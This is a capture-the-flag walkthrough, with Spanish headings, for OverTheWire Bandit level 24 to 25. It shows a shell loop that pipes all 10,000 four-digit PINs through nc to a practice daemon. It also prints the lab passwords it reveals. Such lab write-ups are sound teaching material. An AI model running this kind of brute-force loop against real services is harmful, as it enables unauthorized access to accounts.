# Level 24 -> 25

## Objetivo

-   A daemon is listening on port 30002 and will give you the password for bandit25 if  
    given the password for bandit24 and a secret numeric 4-digit pincode. There is no  
    way to retrieve the pincode except by going through all of the 10000 combinations,  
    called brute-forcing.

## Datos de acceso

-   Host: bandit.labs.overthewire.org
-   Port: 2220
-   User: bandit24
-   Password: VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar

## Solución

-   Send port 30002 the current password, however this will not give you the next password. Brute force is required, loop the current password until you get the new one.

```
bandit24@bandit:~$ nc localhost 30002 <<< VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Fail! You did not supply enough data. Try again.
^C
bandit24@bandit:~$ for i in {0000..9999}; do echo VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i; done | nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Correct!
The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d

Exiting.
bandit24@bandit:~$
```